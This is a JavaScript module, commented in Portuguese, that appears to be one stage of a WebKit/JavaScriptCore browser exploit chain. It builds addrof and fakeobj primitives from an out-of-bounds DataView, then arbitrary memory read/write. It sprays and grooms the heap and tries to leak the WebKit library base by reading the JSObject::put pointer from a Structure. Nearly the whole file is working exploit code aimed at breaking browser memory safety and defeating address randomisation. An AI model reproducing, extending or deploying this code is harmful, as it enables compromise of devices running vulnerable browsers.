// js/script3/testArrayBufferVictimCrash.mjs (v106 - R66 com Novo Valor de Poluição e AB Leak Attempt)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// Adicionada estabilização de heap via "object spray" para mitigar o Garbage Collector.
// Implementada uma verificação funcional de escrita e leitura para confirmar que as
// primitivas de L/E estão funcionando corretamente, eliminando falsos positivos.
//
// NOVO: Heap Feng Shui agressivo antes da tentativa de vazamento do WebKit para
// tentar forçar o alocador a usar regiões de memória "limpas" para o objeto de vazamento.
//
// DIAGNÓSTICO AVANÇADO: Alterar o valor de "poluição" na Fase 4 para confirmar
// a reutilização de heap na Fase 5. Tentar vazar via ArrayBuffer como alternativa.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    oob_read_absolute // Adicionado para diagnósticos mais baixos
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs'; // Importar WEBKIT_LIBRARY_INFO

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v106_R66_PollutionConfirm";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (IMPLEMENTAÇÃO FINAL COM VERIFICAÇÃO)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Diagnóstico de Vazamento Isolado (Offsets Validados, Heap Feng Shui, Confirmação de Poluição) ---`, "test");

    let final_result = {
        success: false,
        message: "A verificação funcional de L/E falhou ou vazamento WebKit falhou.",
        webkit_leak_details: { success: false, msg: "Vazamento WebKit não tentado ou falhou." }
    };

    try {
        // --- FASE 1/2: Obtendo primitivas OOB e addrof/fakeobj... ---
        logS3("--- FASE 1/2: Obtendo primitivas OOB e addrof/fakeobj... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        if (!getOOBDataView()) {
            throw new Error("Falha ao obter primitiva OOB.");
        }
        logS3("OOB DataView obtido com sucesso.", "info");

        // --- VERIFICAÇÃO: OOB DataView m_length ---
        const oob_dv = getOOBDataView();
        const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58; // Direto de core_exploit.mjs
        const OOB_DV_M_LENGTH_OFFSET_IN_DATAVIEW = JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; // De config.mjs
        const ABSOLUTE_OOB_DV_M_LENGTH_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + OOB_DV_M_LENGTH_OFFSET_IN_DATAVIEW; // Calculado

        const oob_m_length_val = oob_dv.getUint32(ABSOLUTE_OOB_DV_M_LENGTH_OFFSET, true);
        logS3(`Verificação OOB: m_length em ${toHex(ABSOLUTE_OOB_DV_M_LENGTH_OFFSET)} é ${toHex(oob_m_length_val)}`, "debug");
        if (oob_m_length_val !== 0xFFFFFFFF) {
            throw new Error(`OOB DataView's m_length não foi corretamente expandido. Lido: ${toHex(oob_m_length_val)}`);
        }
        logS3("VERIFICAÇÃO: OOB DataView m_length expandido corretamente para 0xFFFFFFFF.", "good");


        const confused_array = [13.37];
        const victim_array = [{ a: 1 }];
        const addrof = (obj) => {
            victim_array[0] = obj;
            const addr = doubleToInt64(confused_array[0]);
            logS3(`  addrof(${String(obj).substring(0, 50)}...) -> ${addr.toString(true)}`, "debug");
            return addr;
        };
        const fakeobj = (addr) => {
            confused_array[0] = int64ToDouble(addr);
            const obj = victim_array[0];
            logS3(`  fakeobj(${addr.toString(true)}) -> Object`, "debug");
            return obj;
        };
        logS3("Primitivas 'addrof' e 'fakeobj' operacionais.", "good");

        // --- VERIFICAÇÃO: addrof/fakeobj ---
        const testObjectForPrimitives = { dummy_prop_A: 0xAAAAAAAA, dummy_prop_B: 0xBBBBBBBB };
        const testAddrOfPrimitive = addrof(testObjectForPrimitives);
        if (!isAdvancedInt64Object(testAddrOfPrimitive) || (testAddrOfPrimitive.low() === 0 && testAddrOfPrimitive.high() === 0)) {
            throw new Error("Addrof primitive retornou endereço inválido (0x0).");
        }
        logS3(`VERIFICAÇÃO: Endereço de testObjectForPrimitives (${JSON.stringify(testObjectForPrimitives)}) obtido: ${testAddrOfPrimitive.toString(true)}`, "info");

        const re_faked_object_primitive = fakeobj(testAddrOfPrimitive);
        if (re_faked_object_primitive === null || typeof re_faked_object_primitive !== 'object') {
             throw new Error("Fakeobj retornou um valor inválido (null ou não-objeto).");
        }
        try {
            if (re_faked_object_primitive.dummy_prop_A !== 0xAAAAAAAA || re_faked_object_primitive.dummy_prop_B !== 0xBBBBBBBB) {
                throw new Error(`Fakeobj: Propriedades do objeto re-faked não correspondem. A: ${toHex(re_faked_object_primitive.dummy_prop_A)}, B: ${toHex(re_faked_object_primitive.dummy_prop_B)}`);
            }
            logS3("VERIFICAÇÃO: Fakeobj do testAddrOfPrimitive retornou objeto funcional com propriedades esperadas.", "good");
        } catch (e) {
            throw new Error(`Erro ao acessar propriedade do objeto re-faked (indicando falha no fakeobj): ${e.message}`);
        }

        // --- FASE 3: Construção da Primitiva de L/E Autocontida ---
        logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
        const leaker = { obj_prop: null, val_prop: 0 };
        const leaker_addr = addrof(leaker);
        logS3(`Endereço do objeto leaker: ${leaker_addr.toString(true)}`, "debug");
        
        const arb_read_final = (addr) => {
            logS3(`    arb_read_final: Preparando para ler de ${addr.toString(true)}`, "debug");
            leaker.obj_prop = fakeobj(addr); // Make leaker.obj_prop point to 'addr'
            const result = doubleToInt64(leaker.val_prop); // Read what 'val_prop' now points to
            logS3(`    arb_read_final: Lido ${result.toString(true)} de ${addr.toString(true)}`, "debug");
            return result;
        };
        const arb_write_final = (addr, value) => {
            logS3(`    arb_write_final: Preparando para escrever ${value.toString(true)} em ${addr.toString(true)}`, "debug");
            leaker.obj_prop = fakeobj(addr);
            leaker.val_prop = int64ToDouble(value);
            logS3(`    arb_write_final: Escrita concluída em ${addr.toString(true)}`, "debug");
        };
        logS3("Primitivas de Leitura/Escrita Arbitrária autocontidas estão prontas.", "good");

        // --- FASE 4: Estabilização de Heap e Verificação Funcional de L/E ---
        logS3("--- FASE 4: Estabilizando Heap e Verificando L/E... ---", "subtest");
        
        // 1. Spray de objetos para estabilizar a memória e mitigar o GC
        const spray = [];
        for (let i = 0; i < 1000; i++) {
            spray.push({ spray_A: 0xDEADBEEF, spray_B: 0xCAFEBABE, spray_C: i });
        }
        const test_obj_for_rw_verification = spray[500]; // Pega um objeto do meio do spray para testar R/W
        logS3("Spray de 1000 objetos concluído para estabilização.", "info");

        // 2. Teste de Escrita e Leitura com NOVO VALOR DE POLUIÇÃO
        const test_obj_for_rw_verification_addr = addrof(test_obj_for_rw_verification);
        logS3(`Endereço do test_obj_for_rw_verification: ${test_obj_for_rw_verification_addr.toString(true)}`, "debug");
        const NEW_POLLUTION_VALUE = new AdvancedInt64(0xCAFEBABE, 0xDEADBEEF); // Novo valor para poluir o heap
        
        // As propriedades inline de um JSObject simples (como 'test_obj_for_rw_verification')
        // geralmente começam no offset 0x10 (o BUTTERFLY_OFFSET).
        const prop_spray_A_addr = test_obj_for_rw_verification_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET); 
        
        logS3(`Escrevendo NOVO VALOR DE POLUIÇÃO: ${NEW_POLLUTION_VALUE.toString(true)} no endereço da propriedade 'spray_A' (${prop_spray_A_addr.toString(true)})...`, "info");
        arb_write_final(prop_spray_A_addr, NEW_POLLUTION_VALUE);

        const value_read_for_verification = arb_read_final(prop_spray_A_addr);
        logS3(`>>>>> VERIFICAÇÃO L/E: VALOR LIDO DE VOLTA: ${value_read_for_verification.toString(true)} <<<<<`, "leak");

        if (value_read_for_verification.equals(NEW_POLLUTION_VALUE)) {
            logS3("++++++++++++ SUCESSO TOTAL! O novo valor de poluição foi escrito e lido corretamente. L/E arbitrária é 100% funcional. ++++++++++++", "vuln");
            final_result.success = true; // Confirma que L/E funciona
            final_result.message = "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada.";
        } else {
            throw new Error(`A verificação de L/E falhou. Escrito: ${NEW_POLLUTION_VALUE.toString(true)}, Lido: ${value_read_for_verification.toString(true)}`);
        }

        // --- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT ---
        logS3("--- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT ---", "subtest");
        let webkit_base_candidate = AdvancedInt64.Zero;
        
        try {
            // ** Heap Feng Shui Agressivo **
            logS3("  Executando Heap Feng Shui agressivo para tentar limpar o heap...", "info");
            let aggressive_feng_shui_objects = [];
            for (let i = 0; i < 15000; i++) { // Aumentado para 15.000 para mais agressividade
                // Variar os tamanhos dos objetos para fragmentar o heap de forma mais eficaz
                aggressive_feng_shui_objects.push(new Array(Math.floor(Math.random() * 500) + 10)); // Arrays de 10 a 509 elementos
                aggressive_feng_shui_objects.push({});
                aggressive_feng_shui_objects.push(new String("A".repeat(Math.floor(Math.random() * 200) + 50))); // Strings de 50 a 249 caracteres
                aggressive_feng_shui_objects.push(new Date()); // Outros tipos de objetos
            }
            // Forçar uma coleta de lixo, se possível, liberando as referências
            for (let i = 0; i < aggressive_feng_shui_objects.length; i += 2) { // Liberar metade para fragmentar
                aggressive_feng_shui_objects[i] = null;
            }
            aggressive_feng_shui_objects.length = 0; // Remove todas as referências restantes
            aggressive_feng_shui_objects = null; // Libera o array em si

            await PAUSE_S3(2000); // Pausa ainda maior (2 segundos) para dar tempo ao GC
            logS3(`  Heap Feng Shui concluído. Pausa (2000ms) finalizada. Tentando alocar objeto para vazamento...`, "debug");

            // **Opção 1: Objeto JS Simples (se o problema for de alocação)**
            logS3("  Tentando vazamento com Objeto JS Simples ({})...", "info");
            const obj_for_webkit_leak_js = {}; 
            const obj_for_webkit_leak_js_addr = addrof(obj_for_webkit_leak_js);
            logS3(`  Endereço do objeto dedicado JS Simples (Pós-Feng Shui): ${obj_for_webkit_leak_js_addr.toString(true)}`, "info");

            if (obj_for_webkit_leak_js_addr.low() === 0 && obj_for_webkit_leak_js_addr.high() === 0) {
                throw new Error("Addrof retornou 0 para objeto JS simples (pós-Feng Shui).");
            }
            if (obj_for_webkit_leak_js_addr.high() === 0x7ff80000 && obj_for_webkit_leak_js_addr.low() === 0) {
                throw new Error("Addrof para objeto JS simples é NaN (pós-Feng Shui).");
            }
            await PAUSE_S3(100); // Pequena pausa antes de ler
            
            await performLeakAttemptFromObject(obj_for_webkit_leak_js_addr, "JS Object", arb_read_final, final_result);
            if (final_result.webkit_leak_details.success) {
                logS3("Vazamento bem-sucedido com Objeto JS Simples. Abortando outras tentativas.", "good");
                return final_result;
            }

            // **Opção 2: ArrayBuffer como Objeto de Vazamento (se o layout do JSObject simples for problemático)**
            // Re-executar o Feng Shui entre tentativas para isolamento máximo
            logS3("  Executando Heap Feng Shui novamente antes de tentar ArrayBuffer...", "info");
            aggressive_feng_shui_objects = [];
            for (let i = 0; i < 15000; i++) { // Repetir
                aggressive_feng_shui_objects.push(new Array(Math.floor(Math.random() * 500) + 10));
                aggressive_feng_shui_objects.push({});
                aggressive_feng_shui_objects.push(new String("A".repeat(Math.floor(Math.random() * 200) + 50)));
                aggressive_feng_shui_objects.push(new Date());
            }
            for (let i = 0; i < aggressive_feng_shui_objects.length; i += 2) {
                aggressive_feng_shui_objects[i] = null;
            }
            aggressive_feng_shui_objects.length = 0;
            aggressive_feng_shui_objects = null;
            await PAUSE_S3(2000); // Pausa novamente
            logS3("  Heap Feng Shui (segundo ciclo) concluído. Tentando vazamento com ArrayBuffer...", "debug");

            logS3("  Tentando vazamento com ArrayBuffer...", "info");
            const obj_for_webkit_leak_ab = new ArrayBuffer(0x1000); // Um tamanho fixo
            const obj_for_webkit_leak_ab_addr = addrof(obj_for_webkit_leak_ab);
            logS3(`  Endereço do ArrayBuffer dedicado (Pós-Feng Shui): ${obj_for_webkit_leak_ab_addr.toString(true)}`, "info");

            if (obj_for_webkit_leak_ab_addr.low() === 0 && obj_for_webkit_leak_ab_addr.high() === 0) {
                throw new Error("Addrof retornou 0 para ArrayBuffer (pós-Feng Shui).");
            }
            if (obj_for_webkit_leak_ab_addr.high() === 0x7ff80000 && obj_for_webkit_leak_ab_addr.low() === 0) {
                throw new Error("Addrof para ArrayBuffer é NaN (pós-Feng Shui).");
            }
            await PAUSE_S3(100); // Pequena pausa antes de ler
            
            // Re-use performLeakAttemptFromObject, as ArrayBuffer also has JSCell/Structure
            await performLeakAttemptFromObject(obj_for_webkit_leak_ab_addr, "ArrayBuffer", arb_read_final, final_result);
            if (final_result.webkit_leak_details.success) {
                logS3("Vazamento bem-sucedido com ArrayBuffer. Abortando outras tentativas.", "good");
                return final_result;
            }

            // Se chegamos aqui, nenhuma das tentativas de vazamento foi bem-sucedida.
            throw new Error("Nenhuma estratégia de vazamento de WebKit foi bem-sucedida após Heap Feng Shui e testes múltiplos.");

        } catch (leak_e) {
            final_result.webkit_leak_details.msg = `Falha na tentativa de vazamento do WebKit: ${leak_e.message}`;
            logS3(`ERRO na FASE 5 (Vazamento WebKit): ${leak_e.message}`, "critical");
            logS3(`DETALHES DO ERRO DE VAZAMENTO: ${leak_e.stack || "Sem stack trace."}`, "critical");
            final_result.webkit_leak_details.success = false;
        }

    } catch (e) {
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
        final_result.success = false;
        final_result.webkit_leak_details.success = false;
        final_result.webkit_leak_details.msg = `Vazamento WebKit não foi possível devido a erro na fase anterior: ${e.message}`;
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: (final_result.success && final_result.webkit_leak_details.success) ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: final_result.webkit_leak_details,
        heisenbug_on_M2_in_best_result: (final_result.success && final_result.webkit_leak_details.success),
        oob_value_of_best_result: 'N/A (Estratégia Uncaged)',
        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Verified + WebKit Leak Isolation Diagnostic)' }
    };
}

// =======================================================================================
// Função Auxiliar para tentar vazamento a partir de um objeto dado
// =======================================================================================
async function performLeakAttemptFromObject(obj_addr, obj_type_name, arb_read_func, final_result_ref) {
    logS3(`  Iniciando leituras da JSCell do objeto de vazamento tipo "${obj_type_name}"...`, "debug");

    try {
        // 1. LEITURAS DA JSCell
        const jscell_structure_ptr_addr = obj_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET);
        const structure_addr = arb_read_func(jscell_structure_ptr_addr);
        logS3(`    Lido Structure* (${JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET}): ${structure_addr.toString(true)} de ${jscell_structure_ptr_addr.toString(true)}`, "leak");
        if (!isAdvancedInt64Object(structure_addr) || structure_addr.low() === 0 && structure_addr.high() === 0) throw new Error("Falha ao vazar Structure* (endereço é 0x0).");
        if (structure_addr.high() === 0x7ff80000 && structure_addr.low() === 0) throw new Error("Falha ao vazar Structure* (valor é NaN - provável confusão de tipo ou dados inválidos).");
        if (structure_addr.high() < 0x40000000) logS3(`    ALERTA: Structure* (${structure_addr.toString(true)}) parece um endereço baixo (Smi?), o que é incomum para um ponteiro de estrutura real.`, "warn");

        const structure_id_flattened_val = arb_read_func(obj_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET));
        const structure_id_byte = structure_id_flattened_val.low() & 0xFF;
        logS3(`    Lido StructureID_Flattened (${JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET}): ${toHex(structure_id_byte, 8)} de ${obj_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET).toString(true)} (Valor Full: ${structure_id_flattened_val.toString(true)})`, "leak");
        if (JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.JSObject_Simple_STRUCTURE_ID !== null &&
            obj_type_name === "JS Object" &&
            structure_id_byte !== JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.JSObject_Simple_STRUCTURE_ID) {
            logS3(`    ALERTA: StructureID (${toHex(structure_id_byte, 8)}) não corresponde ao esperado JSObject_Simple_STRUCTURE_ID (${toHex(JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.JSObject_Simple_STRUCTURE_ID, 8)}) para ${obj_type_name}.`, "warn");
        }
        if (JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID !== null &&
            obj_type_name === "ArrayBuffer" &&
            structure_id_byte !== JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID) {
            logS3(`    ALERTA: StructureID (${toHex(structure_id_byte, 8)}) não corresponde ao esperado ArrayBuffer_STRUCTURE_ID (${toHex(JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID, 8)}) para ${obj_type_name}.`, "warn");
        }

        const typeinfo_type_flattened_val = arb_read_func(obj_addr.add(JSC_OFFSETS.JSCell.CELL_TYPEINFO_TYPE_FLATTENED_OFFSET));
        const typeinfo_type_byte = typeinfo_type_flattened_val.low() & 0xFF;
        logS3(`    Lido CELL_TYPEINFO_TYPE_FLATTENED (${JSC_OFFSETS.JSCell.CELL_TYPEINFO_TYPE_FLATTENED_OFFSET}): ${toHex(typeinfo_type_byte, 8)} de ${obj_addr.add(JSC_OFFSETS.JSCell.CELL_TYPEINFO_TYPE_FLATTENED_OFFSET).toString(true)} (Valor Full: ${typeinfo_type_flattened_val.toString(true)})`, "leak");

        // 2. LEITURAS DA STRUCTURE
        logS3(`  Iniciando leituras da Structure para "${obj_type_name}"...`, "debug");
        await PAUSE_S3(50); // Pequena pausa
        
        const class_info_ptr_addr = structure_addr.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET);
        const class_info_addr = arb_read_func(class_info_ptr_addr);
        logS3(`    Lido ClassInfo* (${JSC_OFFSETS.Structure.CLASS_INFO_OFFSET}): ${class_info_addr.toString(true)} de ${class_info_ptr_addr.toString(true)}`, "leak");
        if (!isAdvancedInt64Object(class_info_addr) || class_info_addr.low() === 0 && class_info_addr.high() === 0) throw new Error("Falha ao vazar ClassInfo* (endereço é 0x0).");
        if (class_info_addr.high() === 0x7ff80000 && class_info_addr.low() === 0) throw new Error("Falha ao vazar ClassInfo* (valor é NaN).");
        if (class_info_addr.high() < 0x40000000) logS3(`    ALERTA: ClassInfo* (${class_info_addr.toString(true)}) parece um endereço baixo (Smi?), o que é incomum para um ponteiro de ClassInfo real.`, "warn");

        const global_object_ptr_addr = structure_addr.add(JSC_OFFSETS.Structure.GLOBAL_OBJECT_OFFSET);
        const global_object_addr = arb_read_func(global_object_ptr_addr);
        logS3(`    Lido GlobalObject* (${JSC_OFFSETS.Structure.GLOBAL_OBJECT_OFFSET}): ${global_object_addr.toString(true)} de ${global_object_ptr_addr.toString(true)}`, "leak");
        if (global_object_addr.low() === 0 && global_object_addr.high() === 0) logS3(`    AVISO: GlobalObject* é 0x0.`, "warn");

        const prototype_ptr_addr = structure_addr.add(JSC_OFFSETS.Structure.PROTOTYPE_OFFSET);
        const prototype_addr = arb_read_func(prototype_ptr_addr);
        logS3(`    Lido Prototype* (${JSC_OFFSETS.Structure.PROTOTYPE_OFFSET}): ${prototype_addr.toString(true)} de ${prototype_ptr_addr.toString(true)}`, "leak");
        if (prototype_addr.low() === 0 && prototype_addr.high() === 0) logS3(`    AVISO: Prototype* é 0x0.`, "warn");

        const aggregated_flags_addr = structure_addr.add(JSC_OFFSETS.Structure.AGGREGATED_FLAGS_OFFSET);
        const aggregated_flags_val = arb_read_func(aggregated_flags_addr);
        logS3(`    Lido AGGREGATED_FLAGS (${JSC_OFFSETS.Structure.AGGREGATED_FLAGS_OFFSET}): ${aggregated_flags_val.toString(true)} de ${aggregated_flags_addr.toString(true)}`, "leak");

        await PAUSE_S3(50); // Pequena pausa

        // 3. Leitura do ponteiro JSC::JSObject::put da vtable da Structure
        // Este é o método principal para vazar a base do WebKit.
        const js_object_put_func_ptr_addr_in_structure = structure_addr.add(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET);
        logS3(`  Tentando ler ponteiro de JSC::JSObject::put de ${js_object_put_func_ptr_addr_in_structure.toString(true)} (Structure*+${toHex(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET)}) para "${obj_type_name}"`, "debug");
        const js_object_put_func_addr = arb_read_func(js_object_put_func_ptr_addr_in_structure);
        logS3(`  Lido Endereço de JSC::JSObject::put: ${js_object_put_func_addr.toString(true)}`, "leak");

        if (!isAdvancedInt64Object(js_object_put_func_addr) || js_object_put_func_addr.low() === 0 && js_object_put_func_addr.high() === 0) {
             throw new Error("Falha ao vazar ponteiro para JSC::JSObject::put (endereço é 0x0).");
        }
        if (js_object_put_func_addr.high() === 0x7ff80000 && js_object_put_func_addr.low() === 0) {
            throw new Error("Ponteiro para JSC::JSObject::put é NaN (provável erro de reinterpretação ou JIT).");
        }
        if ((js_object_put_func_addr.low() & 1) === 0 && js_object_put_func_addr.high() === 0) { // Baixo, par, high 0 => possível Smi
            logS3(`    ALERTA: Ponteiro para JSC::JSObject::put (${js_object_put_func_addr.toString(true)}) parece ser um Smi ou endereço muito baixo, o que é incomum para um ponteiro de função.`, "warn");
        }

        // 4. Calcular WebKit Base
        const expected_put_offset_str = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"];
        if (!expected_put_offset_str) {
            throw new Error("Offset de 'JSC::JSObject::put' não encontrado em WEBKIT_LIBRARY_INFO. FUNCTION_OFFSETS.");
        }
        const expected_put_offset = new AdvancedInt64(parseInt(expected_put_offset_str, 16));
        logS3(`  Offset esperado de JSC::JSObject::put no WebKit: ${expected_put_offset.toString(true)}`, "debug");

        const webkit_base_candidate = js_object_put_func_addr.sub(expected_put_offset);
        logS3(`  Candidato a WebKit Base: ${webkit_base_candidate.toString(true)} (Calculado de JSObject::put)`, "leak");

        // 5. Critério de Sanidade para o Endereço Base
        const is_sane_base = webkit_base_candidate.high() > 0x40000000 && (webkit_base_candidate.low() & 0xFFF) === 0;
        logS3(`  Verificação de Sanidade do WebKit Base: Alto > 0x40000000 e alinhado a 0x1000? ${is_sane_base}`, is_sane_base ? "good" : "warn");

        if (!is_sane_base) {
            throw new Error(`Candidato a WebKit base não passou na verificação de sanidade para ${obj_type_name}.`);
        }

        // Se chegamos aqui, o vazamento foi bem-sucedido para este tipo de objeto.
        final_result_ref.webkit_leak_details = {
            success: true,
            msg: `Endereço base do WebKit vazado com sucesso via ${obj_type_name}.`,
            webkit_base_candidate: webkit_base_candidate.toString(true),
            js_object_put_addr: js_object_put_func_addr.toString(true)
        };
        logS3(`++++++++++++ VAZAMENTO WEBKIT SUCESSO via ${obj_type_name}! ++++++++++++`, "vuln");
        return true; // Sucesso na tentativa de vazamento
    } catch (leak_attempt_e) {
        logS3(`  Falha na tentativa de vazamento com ${obj_type_name}: ${leak_attempt_e.message}`, "warn");
        return false; // Falha na tentativa de vazamento
    }
}
